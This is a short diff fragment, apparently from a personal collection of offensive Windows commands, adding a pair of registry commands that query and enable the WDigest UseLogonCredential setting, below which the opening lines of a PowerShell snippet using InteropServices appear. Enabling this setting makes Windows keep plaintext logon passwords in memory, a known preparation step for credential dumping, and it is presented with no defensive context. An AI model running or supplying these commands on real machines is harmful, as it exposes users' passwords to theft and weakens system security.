@@ -2,6 +2,12 @@
 
 ==============================================================================================================================
 
+reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
+
+reg add HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+
+==============================================================================================================================
+
 $c = ‘t’
 $Win32 = @”
 using System.Runtime.InteropServices;
